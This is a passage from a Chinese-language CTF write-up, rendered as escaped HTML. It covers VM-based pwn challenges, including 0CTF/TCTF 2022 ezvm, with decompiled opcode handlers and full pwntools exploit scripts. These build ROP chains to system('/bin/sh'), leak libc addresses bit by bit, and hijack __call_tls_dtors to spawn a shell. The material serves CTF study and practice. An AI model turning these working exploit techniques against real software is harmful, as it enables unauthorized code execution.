medium&amp;gt;&amp;gt;high&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处&lt;/p&gt;&#xA;&lt;p&gt;这里low和medium不要是同一寄存器&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;unsigned __int64 __fastcall load(vm_struct *vm_struct, __int64 stack)&#xA;{&#xA;  unsigned __int64 result; // rax&#xA;  unsigned int v3; // [rsp&amp;#43;20h] [rbp-20h]&#xA;  _QWORD *v4; // [rsp&amp;#43;30h] [rbp-10h]&#xA;&#xA;  v3 = *(_DWORD *)(vm_struct-&amp;gt;opcode &amp;#43; (vm_struct-&amp;gt;rip &amp;amp; 0xFFFFFFFFFFFFFFFCLL));&#xA;  vm_struct-&amp;gt;rip &amp;#43;= 4LL;&#xA;  result = (unsigned __int8)byte_4010;          // 0xff&#xA;  if ( (unsigned __int8)(vm_struct-&amp;gt;reg[(v3 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; BYTE2(v3)) &amp;lt; (unsigned __int8)byte_4010 )&#xA;  {&#xA;    v4 = (_QWORD *)((unsigned __int16)(vm_struct-&amp;gt;reg[(v3 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; (HIWORD(v3) &amp;amp; 0xFFF)) &amp;#43; stack);&#xA;    *v4 = vm_struct-&amp;gt;reg[v3 &amp;amp; 0x1F];&#xA;    return (unsigned __int64)v4;&#xA;  }&#xA;  return result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;vm_struct *__fastcall mov(vm_struct *vm_struct, __int64 a2)&#xA;{&#xA;  vm_struct *vm_struct_1; // rax&#xA;  unsigned __int16 v3; // [rsp&amp;#43;1Eh] [rbp-22h]&#xA;  unsigned int v4; // [rsp&amp;#43;20h] [rbp-20h]&#xA;&#xA;  v4 = *(_DWORD *)(vm_struct-&amp;gt;opcode &amp;#43; (vm_struct-&amp;gt;rip &amp;amp; 0xFFFFFFFFFFFFFFFCLL));&#xA;  vm_struct-&amp;gt;rip &amp;#43;= 4LL;&#xA;  vm_struct_1 = (vm_struct *)(unsigned __int8)byte_4010;&#xA;  if ( (unsigned __int8)(vm_struct-&amp;gt;reg[(v4 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; BYTE2(v4)) &amp;lt; (unsigned __int8)byte_4010 )// 0xff&#xA;  {&#xA;    vm_struct_1 = vm_struct;&#xA;    v3 = vm_struct-&amp;gt;reg[(v4 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; (HIWORD(v4) &amp;amp; 0xFFF);&#xA;    vm_struct-&amp;gt;reg[v4 &amp;amp; 0x1F] = ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 7) &amp;lt;&amp;lt; 56)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 6) &amp;lt;&amp;lt; 48)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 5) &amp;lt;&amp;lt; 40)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 4) &amp;lt;&amp;lt; 32)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 3) &amp;lt;&amp;lt; 24)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 2) &amp;lt;&amp;lt; 16)&#xA;                              | *(unsigned __int16 *)(v3 &amp;#43; a2);&#xA;  }&#xA;  return vm_struct_1;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;思路-1&#34;&gt;&lt;span&gt;思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;把栈上的libc地址存在vm_struct的寄存器中&lt;/li&gt;&#xA;&lt;li&gt;因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西&lt;/li&gt;&#xA;&lt;li&gt;把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链&lt;/li&gt;&#xA;&lt;li&gt;把rop链写入栈中返回地址处&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp-2&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-2&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn1&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    # bbase 0x1b70&#xA;    # bbase 0x1AFB #Unsupported instruction的leave;ret&#xA;    bbase 0x1aad&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    # gdb.attach(p)&#xA;    gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;def op(opcode,high,medium,low):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (high&amp;amp;0x1f)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (low&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def add(high,medium,low):&#xA;    return op(1,high,medium,low)&#xA;&#xA;def sub(high,medium,low):&#xA;    return op(2,high,medium,low)&#xA;&#xA;def load(offset,medium,src,opcode=9):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (src&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def store(offset,medium,dest,opcode=10):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (dest&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;base_addr = 0x120&amp;#43;0x38&#xA;dest_offset = 0x118&#xA;#dest:&#xA;# 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix&amp;#43;875) ◂— pop rdi&#xA;#ret_addr:&#xA;# 27:0138│&amp;#43;008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop&#xA;opcode = store(0xd38,0,0) #libc地址给寄存器0&#xA;opcode&amp;#43;= store(base_addr,20,1) #system的偏移给寄存器1，20这里随便设置，不和low一样就行&#xA;opcode&amp;#43;= store(base_addr&amp;#43;8,20,2) #binsh的偏移给寄存器2&#xA;opcode&amp;#43;= store(base_addr&amp;#43;0x10,20,3) #ret的偏移给寄存器3&#xA;opcode&amp;#43;= store(base_addr&amp;#43;0x18,20,4) #pop_rdi_ret偏移给寄存器4&#xA;opcode&amp;#43;= add(0,1,5) #寄存器5=寄存器0&amp;#43;system偏移=system地址&#xA;opcode&amp;#43;= add(0,2,6) #寄存器6=寄存器0&amp;#43;binsh偏移=binsh地址&#xA;opcode&amp;#43;= sub(3,0,7) #寄存器7=寄存器0-ret偏移=ret地址&#xA;opcode&amp;#43;= add(0,4,8) #寄存器8=寄存器0&amp;#43;pop_rdi_ret偏移=pop_rdi_ret地址&#xA;&#xA;opcode&amp;#43;= load(dest_offset,20,8) #pop_rdi_ret&#xA;opcode&amp;#43;= load(dest_offset&amp;#43;8,20,6) #binsh&#xA;opcode&amp;#43;= load(dest_offset&amp;#43;0x10,20,7) #ret&#xA;opcode&amp;#43;= load(dest_offset&amp;#43;0x18,20,5) #system&#xA;&#xA;opcode&amp;#43;=p32(0)&#xA;opcode&amp;#43;=p64(0x2e586) #system&#xA;opcode&amp;#43;=p64(0x1a1265) #binsh&#xA;opcode&amp;#43;=p64(0x199b) #ret&#xA;opcode&amp;#43;=p64(0xe55c1) #pop_rdi_ret&#xA;&#xA;# dbg()&#xA;sla(b&amp;#39;opcode: &amp;#39;,opcode)&#xA;&#xA;itr()&#xA;# sbase 0x40c0&#xA;&#xA;# 0x7fff2d02dd50 #main栈帧中存储opcode地址&#xA;# 0x7fff2d02dc30 #execute 中stack地址&#xA;#之间偏移为0x120&#xA;&#xA;#system = 寄存器0 &amp;#43; 0x2e586&#xA;#binsh = 寄存器0 &amp;#43; 0x1a1265&#xA;#ret = 寄存器0 - 0x199b&#xA;#pop_rdi_ret = 寄存器0 &amp;#43; 0xe55c1&#xA;&#xA;&#xA;&#xA;# pwndbg&amp;gt; sbase 0x40c0&#xA;# 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main&amp;#43;122) ◂— mov edi, eax&#xA;# 01:0008│         0x6127080540c8 ◂— 0&#xA;# 02:0010│         0x6127080540d0 ◂— 0&#xA;# 03:0018│         0x6127080540d8 ◂— 0&#xA;# 04:0020│         0x6127080540e0 ◂— 0&#xA;# 05:0028│         0x6127080540e8 ◂— 0&#xA;# 06:0030│         0x6127080540f0 ◂— 0&#xA;# 07:0038│         0x6127080540f8 ◂— 0&#xA;# 08:0040│         0x612708054100 ◂— 0&#xA;# 09:0048│         0x612708054108 ◂— 0&#xA;# pwndbg&amp;gt; p &amp;amp;system&#xA;# $1 = (int (*)(const char *)) 0x759f7fe58750 &amp;lt;__libc_system&amp;gt;&#xA;# pwndbg&amp;gt; search &amp;#34;/bin/sh&amp;#34;                                                       &#xA;# Searching for byte: b&amp;#39;/bin/sh&amp;#39;&#xA;# libc.so.6       0x759f7ffcb42f 0x68732f6e69622f /* &amp;#39;/bin/sh&amp;#39; */&#xA;# pwndbg&amp;gt; p/x 0x759f7fe58750 - 0x759f7fe2a1ca&#xA;# $2 = 0x2e586&#xA;# pwndbg&amp;gt; p/x 0x759f7ffcb42f - 0x759f7fe2a1ca&#xA;# $3 = 0x1a1265&#xA;&#xA;#ret指令&#xA;# 0x000000000002882f : ret &#xA;# pwndbg&amp;gt; p/x 0x759f7fe2a1ca - 0x759f7fe2882f&#xA;# $6 = 0x199b&#xA;# 寄存器1 - binsh地址 = 0x199b&#xA;&#xA;#pop_rdi_ret&#xA;# 0x000000000010f78b : pop rdi ; ret&#xA;# pwndbg&amp;gt; p/x  0x759f7ff0f78b - 0x759f7fe2a1ca&#xA;# $8 = 0xe55c1&#xA;# pop_rdi_ret - 寄存器0 = 0xe55c1&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;2020网鼎杯青龙组-boom1&#34;&gt;&lt;span&gt;2020网鼎杯青龙组-boom1&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#2020%e7%bd%91%e9%bc%8e%e6%9d%af%e9%9d%92%e9%be%99%e7%bb%84-boom1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&amp;amp;u_asig=1a0c381017440330108046584e0135&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&amp;u_asig=1a0c381017440330108046584e0135&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;编译器类vmpwn&lt;/p&gt;&#xA;&lt;p&gt;大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;malloc(0x40000u);&lt;/code&gt;会走mmap，申请的变量和libc的偏移是固定的&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;我们可以定义一个变量，从这个变量的地址寻址到&lt;code&gt;__free_hook&lt;/code&gt;和&lt;code&gt;system&lt;/code&gt;函数，将后者覆写到前者，再调用&lt;code&gt;free(&#39;/bin/sh&#39;)&lt;/code&gt;即可。&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;0ctftctf-2022-ezvm&#34;&gt;&lt;span&gt;0CTF/TCTF 2022 ezvm&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#0ctftctf-2022-ezvm&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm&lt;/p&gt;&#xA;&lt;p&gt;指令梳理：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;0 push: 把memory的数据压入栈中&#xA;1 pop: 栈中数据弹出到memory&#xA;2-12 ： 对栈中数据进行加减乘除等操作，并把sp-1&#xA;13 : 判断栈顶是否为0&#xA;14-16： jmp jz jnz &#xA;17-19: 比较指令&#xA;20 mov: 写8字节到bss段（类似寄存器）&#xA;21 store:指定寄存器中数据写入到memory区域&#xA;22 load:把memory中的数据写入到指定寄存器&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;push    =   lambda bss              :p8(0)&amp;#43;p8(bss) #压入寄存器的内容到栈&#xA;and_f   =   lambda                  :p8(9)&#xA;nz      =   lambda add_ip           :p8(15)&amp;#43;p64(add_ip)&#xA;jnz     =   lambda add_ip           :p8(16)&amp;#43;p64(add_ip)&#xA;mov     =   lambda bss,imm          :p8(0x14)&amp;#43;p8(bss)&amp;#43;p64(imm) #imm-&amp;gt;寄存器&#xA;store   =   lambda bss,memory       :p8(0x15)&amp;#43;p8(bss)&amp;#43;p64(memory) #寄存器-&amp;gt;memory &#xA;load    =   lambda bss,memory       :p8(0x16)&amp;#43;p8(bss)&amp;#43;p64(memory) #mrmory-&amp;gt;寄存器             &#xA;exit_f  =   lambda                  :p8(0x17)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关键点在于这个malloc会把size左移3个bit，传入&lt;code&gt;0x2000000000030000&lt;/code&gt;就能越界写&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.text:0000000000002353                 mov     rax, [rbp&amp;#43;size_1]&#xA;.text:0000000000002357                 shl     rax, 3&#xA;.text:000000000000235B                 mov     [rbp&amp;#43;var_10], rax&#xA;.text:000000000000235F                 mov     rax, [rbp&amp;#43;var_10]&#xA;.text:0000000000002363                 mov     rdi, rax        ; size&#xA;.text:0000000000002366                 call    _malloc&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;free一个堆块进unsorted bin，memory 区域会留下libc&lt;/li&gt;&#xA;&lt;li&gt;爆破出libc&lt;/li&gt;&#xA;&lt;li&gt;利用&lt;code&gt;__call_tls_dtors&lt;/code&gt;来getshell&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp-3&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-3&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;不知道为什么最后&lt;code&gt;bye bye&lt;/code&gt;的时候退不出去。。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;,&amp;#34;-p&amp;#34;,&amp;#34;65&amp;#34;,&amp;#34;-b&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    # bbase 0x23BF #call execute&#xA;    # bbase 0x2353 #malloc&#xA;    # bbase 0x228E #out malloc&#xA;    bbase 0x14e2 #free&#xA;    # bbase 0x1a0d #shr&#xA;    # bbase 0x1582 #switch&#xA;    # bbase 0x246F #exit&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;push    =   lambda bss              :p8(0)&amp;#43;p8(bss) #压入寄存器的内容到栈&#xA;and_f   =   lambda                  :p8(9)&#xA;nz      =   lambda add_ip           :p8(15)&amp;#43;p64(add_ip)&#xA;jnz     =   lambda add_ip           :p8(16)&amp;#43;p64(add_ip)&#xA;mov     =   lambda bss,imm          :p8(0x14)&amp;#43;p8(bss)&amp;#43;p64(imm) #imm-&amp;gt;寄存器&#xA;store   =   lambda bss,memory       :p8(0x15)&amp;#43;p8(bss)&amp;#43;p64(memory) #寄存器-&amp;gt;memory &#xA;load    =   lambda bss,memory       :p8(0x16)&amp;#43;p8(bss)&amp;#43;p64(memory) #mrmory-&amp;gt;寄存器             &#xA;exit_f  =   lambda                  :p8(0x17)&#xA;&#xA;#让memory为main_arena地址&#xA;sla(b&amp;#39;0ctf2022!!\n&amp;#39;,b&amp;#39;aaaa&amp;#39;)&#xA;opcode = exit_f()&#xA;sla(b&amp;#39;code size:\n&amp;#39;,str(len(opcode)))&#xA;sla(b&amp;#39;memory count:\n&amp;#39;,str(0x410&amp;gt;&amp;gt;3))&#xA;sla(b&amp;#39;input your code:\n&amp;#39;,opcode)&#xA;&#xA;# sla(b&amp;#39;continue?\n&amp;#39;,b&amp;#39;c&amp;#39;)&#xA;&#xA;#爆破获取libc&#xA;libc_base = 0x700000000000&#xA;for i in range(4,45,1):&#xA;    print(&amp;#39;leaking bit &amp;#39;&amp;#43;str(i))&#xA;    opcode = mov(0,1&amp;lt;&amp;lt;i)        #bitmask存入r0&#xA;    opcode&amp;#43;= push(0)            #bitmask 压栈&#xA;    opcode&amp;#43;= load(1,0)          #main_arena地址存入r1&#xA;    opcode&amp;#43;= push(1)            #r1压栈&#xA;    opcode&amp;#43;= and_f()            #bit_mask 和 main_arena 与运算&#xA;    opcode&amp;#43;= jnz(1)             #该bit为0就exit&#xA;    opcode&amp;#43;= b&amp;#39;\x18&amp;#39; &amp;#43; exit_f()&#xA;&#xA;    sla(b&amp;#39;code size:\n&amp;#39;,str(len(opcode)))&#xA;    sla(b&amp;#39;memory count:\n&amp;#39;,str(0x410&amp;gt;&amp;gt;3))&#xA;    sla(b&amp;#39;input your code:\n&amp;#39;,opcode)&#xA;&#xA;    buffer = ru(b&amp;#39;finish!\n&amp;#39;,drop=True)&#xA;    if b&amp;#39;what&amp;#39; in buffer:&#xA;        libc_base |= 1&amp;lt;&amp;lt;i&#xA;    &#xA;libc_base -= 0x219ce0&#xA;libc.address = libc_base&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;&#xA;def rol(value):&#xA;    return (value &amp;lt;&amp;lt; 0x11) | (value &amp;gt;&amp;gt; (64 - 0x11)) &amp;amp; 0xffffffffffffffff&#xA;dest = rol(libc.sym[&amp;#39;system&amp;#39;])&#xA;&#xA;#$fs_base &amp;#43; 0x30（randnumber） 置0 &#xA;#0x181760 fs_base&amp;#43;0x30&#xA;opcode = store(0,0x302ec) # clear rand val&#xA;opcode&amp;#43;= mov(0,libc_base - 0x2a00)&#xA;#0x1816d8 $fs_base - 